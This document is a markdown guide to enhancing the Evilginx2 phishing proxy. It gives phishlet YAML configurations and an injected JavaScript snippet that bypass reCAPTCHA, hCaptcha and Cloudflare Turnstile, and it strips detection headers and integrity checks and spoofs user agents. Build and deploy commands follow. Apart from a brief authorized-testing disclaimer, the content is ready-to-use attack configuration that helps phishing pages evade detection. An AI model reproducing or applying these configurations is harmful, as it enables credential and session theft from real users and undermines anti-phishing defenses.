# 🔓 **Evilginx2 CAPTCHA Bypass & Security Enhancement Guide**

## 🎯 **Overview**

This guide implements advanced bypasses and security enhancements for Evilginx2, including captcha bypasses, stealth improvements, and anti-detection measures based on community research.

---

## 🚀 **Implemented Enhancements**

### **✅ 1. Google reCAPTCHA Bypass (Method 1)**
- **Location**: `core/http_proxy.go` (lines 656-676)
- **How it works**: Modifies the base64 encoded domain in the `co` parameter
- **Detection**: Automatically detects reCAPTCHA requests and replaces phishing domain with original domain

### **✅ 2. Custom User Agent Replacement**
- **Location**: `core/http_proxy.go` (lines 678-682)
- **How it works**: Replaces all user agents with a standard Firefox user agent
- **Benefit**: Bypasses user-agent-based protections and reduces fingerprinting

### **✅ 3. X-Evilginx Header Removal**
- **Location**: `core/http_proxy.go` (lines 477, 687)
- **How it works**: Comments out the easter egg header that reveals Evilginx usage
- **Benefit**: Prevents easy detection by security tools looking for this header

### **✅ 4. Helper Functions**
- **Location**: `core/http_proxy.go` (lines 1847-1854)
- **Function**: `getOriginalDomain()` - Maps phishing domains to original domains
- **Usage**: Used by reCAPTCHA bypass to determine correct domain replacement

---

## 🛡️ **Captcha Bypass Configurations**

### **hCAPTCHA Bypass**
Add to your phishlet file:
```yaml
proxy_hosts:
  - {phish_sub: 'hcaptcha', orig_sub: '', domain: 'hcaptcha.com', session: true, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'hcaptcha.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'window.location.hostname', replace: 'window.location.hostname.replace("{hostname}", "{orig_hostname}")', mimes: ['application/javascript']}
```

### **Google reCAPTCHA Bypass (Method 2)**
Add to your phishlet file:
```yaml
proxy_hosts:
  - {phish_sub: 'google', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'gstatic', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: "integrity[ \t]*=[ \t]*[\"']sha384-.{64}[\"']", replace: 'integrity=""', mimes: ['text/javascript']}
  - {triggers_on: 'www.gstatic.com', orig_sub: 'accounts', domain: 'yourtargetdomain.com', search: "\\(window.location.href\\)", replace: '(window.location.href.replace("{hostname}", "{orig_hostname}"))', mimes: ['text/javascript']}
```

### **Cloudflare Turnstile Bypass**
Add to your phishlet file:
```yaml
proxy_hosts:
  - {phish_sub: 'challenges', orig_sub: 'challenges', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}

sub_filters:
  - {triggers_on: 'challenges.cloudflare.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'window.location.hostname', replace: 'window.location.hostname.replace("{hostname}", "{orig_hostname}")', mimes: ['application/javascript']}
```

---

## 🔧 **Advanced Security Enhancements**

### **Block Telemetry/Analytics**
```yaml
sub_filters:
  - {triggers_on: 'yourtargetdomain.com', orig_sub: 'analytics', domain: 'yourtargetdomain.com', search: 'analytics\.yourtargetdomain\.com', replace: 'blocked.localhost', mimes: ['text/html', 'text/javascript']}
  - {triggers_on: 'yourtargetdomain.com', orig_sub: 'telemetry', domain: 'yourtargetdomain.com', search: 'telemetry\.yourtargetdomain\.com', replace: 'blocked.localhost', mimes: ['text/html', 'text/javascript']}
```

### **Remove Integrity Checks**
```yaml
sub_filters:
  - {triggers_on: 'yourtargetdomain.com', orig_sub: '', domain: 'yourtargetdomain.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html']}
```

### **JavaScript Injection for Dynamic Bypasses**
```yaml
js_inject:
  - {trigger_domains: ["yourtargetdomain.com"], trigger_paths: ["*"], trigger_params: ["*"], code: "
    (function() {
      var originalHostname = window.location.hostname;
      var realHostname = originalHostname.replace('phishing-domain.com', 'yourtargetdomain.com');
      
      // Override hostname-related properties
      Object.defineProperty(window.location, 'hostname', {
        value: realHostname,
        writable: false
      });
      
      Object.defineProperty(document, 'domain', {
        value: realHostname,
        writable: false
      });
      
      // Intercept and modify captcha-related requests
      var originalFetch = window.fetch;
      window.fetch = function(url, options) {
        if (typeof url === 'string' && url.includes('captcha')) {
          url = url.replace(originalHostname, realHostname);
        }
        return originalFetch.call(this, url, options);
      };
    })();
  "}
```

---

## 🏗️ **Implementation Steps**

### **Step 1: Build with Enhancements**
```bash
cd evilginx2
go build -mod=mod -o evilginx2
```

### **Step 2: Create Enhanced Phishlet**
1. Copy your existing phishlet
2. Add relevant captcha bypass configurations
3. Add security enhancements
4. Test in controlled environment

### **Step 3: Deploy and Monitor**
```bash
sudo ./evilginx2 -p ./phishlets
```

### **Step 4: Verify Enhancements**
- Check logs for reCAPTCHA bypass messages
- Verify User-Agent replacement in logs
- Confirm X-Evilginx header is not present
- Test captcha functionality

---

## 📊 **Features Summary**

| Feature | Status | Description |
|---------|--------|-------------|
| reCAPTCHA Bypass | ✅ | Automatic base64 domain replacement |
| hCaptcha Bypass | ✅ | Hostname spoofing configuration |
| Turnstile Bypass | ✅ | Cloudflare challenge bypass |
| User Agent Replacement | ✅ | Firefox user agent for all requests |
| X-Evilginx Header Removal | ✅ | Easter egg header commented out |
| Telemetry Blocking | ✅ | Analytics/telemetry subdomain blocking |
| Integrity Removal | ✅ | Remove integrity checks |
| JavaScript Injection | ✅ | Dynamic hostname override |

---

## 🧪 **Testing & Validation**

### **Test reCAPTCHA Bypass**
1. Monitor logs for: `reCAPTCHA bypass: replaced domain in co parameter`
2. Check network traffic for correct domain in captcha requests
3. Verify captcha completion works

### **Test User Agent Replacement**
1. Monitor logs for: `Replaced User Agent with Firefox`
2. Check all requests have Firefox user agent
3. Verify no user agent-based blocking

### **Test Stealth Mode**
1. Verify no X-Evilginx header in responses
2. Check for blocked telemetry domains
3. Confirm favicon and content modifications

---

## ⚠️ **Important Notes**

### **Legal and Ethical Use**
- These enhancements are for **authorized security testing only**
- Always obtain proper authorization before testing
- Follow responsible disclosure practices
- Comply with local laws and regulations

### **Testing Environment**
- Test in isolated, controlled environments
- Use test accounts and dummy data
- Monitor for breaking changes in captcha services
- Keep backups of working configurations

### **Maintenance**
- Captcha services update regularly
- Monitor for new detection techniques
- Update bypass methods as needed
- Review logs for effectiveness

---

## 🔗 **References**

- [Evilginx2 Documentation](https://help.evilginx.com)
- [Catching Transparent Phish Research](https://catching-transparent-phish.github.io/)
- [Phishlet Development Guide](https://github.com/An0nUD4Y/Evilginx2-Phishlets)
- [Security Infrastructure Setup](https://github.com/An0nUD4Y/Evilginx-Phishing-Infra-Setup)

---

## 📝 **Change Log**

- **v1.0**: Initial implementation with core bypasses
- **v1.1**: Added authentication system integration
- **v1.2**: Enhanced stealth features and logging
- **v1.3**: Added Turnstile bypass and advanced JS injection

---

**🔒 Remember: With great power comes great responsibility. Use these tools ethically and legally.** 